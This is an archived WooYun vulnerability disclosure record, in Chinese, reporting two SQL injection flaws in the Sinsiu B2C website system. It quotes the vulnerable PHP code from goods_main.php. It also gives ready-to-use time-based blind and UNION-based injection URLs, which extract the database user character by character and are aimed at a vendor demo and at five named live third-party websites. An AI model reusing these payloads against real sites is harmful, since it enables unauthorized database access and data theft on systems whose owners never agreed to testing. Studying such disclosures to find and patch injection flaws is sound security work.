{"id": 29947, "wybug_id": "wooyun-2015-0117878", "wybug_title": "新秀企业网站系统sql注入2处", "wybug_corp": "新秀企业网站系统", "wybug_author": "路人甲", "wybug_date": "2015-07-01 11:59", "wybug_open_date": "2015-08-15 12:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-01：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-08-15：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： sinsiu_b2c_1_0_3 bypass 详细说明：  首先看效果http://localhost:8080/sinsiu_b2c_1_0_3/upload/?/goods/cat-1*if(ascii(substr((select+user()from(b2c_varia)where(var_id=1)),1,1))=114,sleep(5),1)/这样一来就可以遍历全站了看看demohttp://b2c.demo.sinsiu.com/?/goods/cat-1*if(ascii(substr((select+user()from(b2c_varia)where(var_id=1)),1,1))=114,sleep(5),1)/都可以造成延迟代码:goods_main.php:\n<?phpfunction module_goods_main(){\tglobal $global,$smarty;\t$global['brand'] = get_global('brand');\t$global['price'] = get_global('price');\t$global['sell'] = get_global('sell');\t$goo_promotion = get_global('promotion');\t$goo_best = get_global('best');\t$goo_new = get_global('new');\t$goo_hot = get_global('hot');\t$prefix = 'goods';\t\tif(!$global['id'])\t{\t\t$list_len = get_varia('img_list_len');\t\t$obj = new goods();\t\t$obj->set_field('goo_id,goo_title,goo_x_img,goo_market_price,goo_shop_price');\t\tif($global['cat'])\t\t{\t\t\t$family = implode(',',get_cat_family('cat_goo',$global['cat']));\t\t\t$obj->set_where(\"goo_cat_id in ($family)\");\t\t\t$prefix .= '/cat-' . $global['cat'];\t\t}\t\tif($global['brand'])\t\t{\t\t\t$obj->set_where('goo_brand_id = '.$global['brand']);\t\t\t$prefix .= '/brand-' . $global['brand'];\t\t}\t\tif($goo_promotion)\t\t{\t\t\t$obj->set_where('goo_promotion = 1');\t\t\t$prefix .= '/promotion-1';\t\t}elseif($goo_best){\t\t\t$obj->set_where('goo_best = 1');\t\t\t$prefix .= '/best-1';\t\t}elseif($goo_new){\t\t\t$obj->set_where('goo_new = 1');\t\t\t$prefix .= '/new-1';\t\t}elseif($goo_hot){\t\t\t$obj->set_where('goo_hot = 1');\t\t\t$prefix .= '/hot-1';\t\t}\t\t\t\tif($global['price'] == 'desc')\t\t{\t\t\t$obj->set_order('goo_shop_price');\t\t}elseif($global['price'] == 'asc'){\t\t\t$obj->set_order('goo_shop_price','asc');\t\t}\t\t\tif($global['sell'] == 'desc')\t\t{\t\t\t$obj->set_order('goo_sell');\t\t}elseif($global['sell'] == 'asc'){\t\t\t$obj->set_order('goo_sell','asc');\t\t}\t\t\t\t$obj->set_page_size($list_len ? $list_len : 30);\t\t$obj->set_page_num($global['page']);\t\t$sheet = $obj->get_sheet();\t\tfor($i = 0; $i < count($sheet); $i ++)\t\t{\t\t\t$sheet[$i]['goo_title'] = cut_str($sheet[$i]['goo_title'],11);\t\t}\t\tset_link($obj->get_page_sum());\t\t$smarty->assign('show_sheet',1);\t\t$smarty->assign('goods',$sheet);\t}else{\t\t$obj = new goods();\t\t$obj->set_where('goo_id = '.$global['id']);\t\t$goods = $obj->get_one();\t\t$obj->set_value('goo_hits',$goods['goo_hits'] + 1);\t\t$obj->edit();\t\t\t\t$goods['more_img'] = array();\t\tif($goods['goo_more_img'] != '')\t\t{\t\t\t$goods['more_img'] = explode('|',$goods['goo_more_img']);\t\t}\t\t$goods['brand'] = get_data('brand',$goods['goo_brand_id'],'bra_name');\t\t\t\t$goods['att'] = array();\t\t$obj = new attribute();\t\t$att_arr = $obj->get_list();\t\t$goods['att'] = get_att_list($att_arr,$goods['goo_attribute']);\t\t\t\tadd_to_history($goods['goo_id']);\t\t\t\t$obj = new varia();\t\t$smarty->assign('share_code',$obj->get_value('share_code',true));\t\t\t\t$smarty->assign('goods',$goods);\t\t$smarty->assign('show_sheet',0);\t}\t$smarty->assign('prefix',$prefix);}function add_to_history($id){\t$val = get_cookie('history');\tif($val == '')\t{\t\t$val = '|' . $id . '|';\t}elseif(strpos($val,'|' . $id . '|') === false){\t\t$val = substr($val,1,-1);\t\t$arr = explode('|',$val);\t\t$val = '|';\t\tfor($i = 0; $i < count($arr) && $i < 7; $i ++)\t\t{\t\t\t$val .= $arr[$i] . '|';\t\t}\t\t$val = '|' . $id . $val;\t}\tset_cookie('history',$val);}//新秀?>\n\nif($global['brand'])\t\t{\t\t\t$obj->set_where('goo_brand_id = '.$global['brand']);\t\t\t$prefix .= '/brand-' . $global['brand'];\t\t}\n第二处\n$obj = new goods();\t\t$obj->set_where('goo_id = '.$global['id']);\t\t$goods = $obj->get_one();\n第一处举例证明  1.http://tnkjw.com/?/goods/cat-1*if(1,sleep(5),1)/  2.http://www.ledpf.com/?/goods/cat-1*if(1,sleep(5),1)/  3.http://tnkjw.com/?/goods/cat-1*if(1,sleep(5),1)/  4.http://645.net.cn/?/goods/cat-1*if(1,sleep(1),1)/  5.http://www.nbcxaf.com/?/goods/cat-1*if(1,sleep(1),1)/第二处举例证明，不知道怎么回事这些网站和实际demo测试反射出来的不是敏感信息但是从另外一个方面还是可以证明sql注射存在：1.http://tnkjw.com/?/search/index.html/cat-0/key-%25%27%20union%20select%20sleep%285%29%2Cuser%28%29%2Cuser%28%29%2Cuser%28%29%2Cuser%28%29%23/2.http://www.ledpf.com/?/search/index.html/cat-0/key-%25%27%20union%20select%20sleep%285%29%2Cuser%28%29%2Cuser%28%29%2Cuser%28%29%2Cuser%28%29%23/3.http://tnkjw.com/?/search/index.html/cat-0/key-%25%27%20union%20select%20sleep%285%29%2Cuser%28%29%2Cuser%28%29%2Cuser%28%29%2Cuser%28%29%23/4.http://645.net.cn/?/search/index.html/cat-0/key-%25%27%20union%20select%20sleep%285%29%2Cuser%28%29%2Cuser%28%29%2Cuser%28%29%2Cuser%28%29%23/5.http://www.nbcxaf.com/?/search/index.html/cat-0/key-%25%27%20union%20select%20sleep%285%29%2Cuser%28%29%2Cuser%28%29%2Cuser%28%29%2Cuser%28%29%23/都造成五秒延迟   漏洞证明：     修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}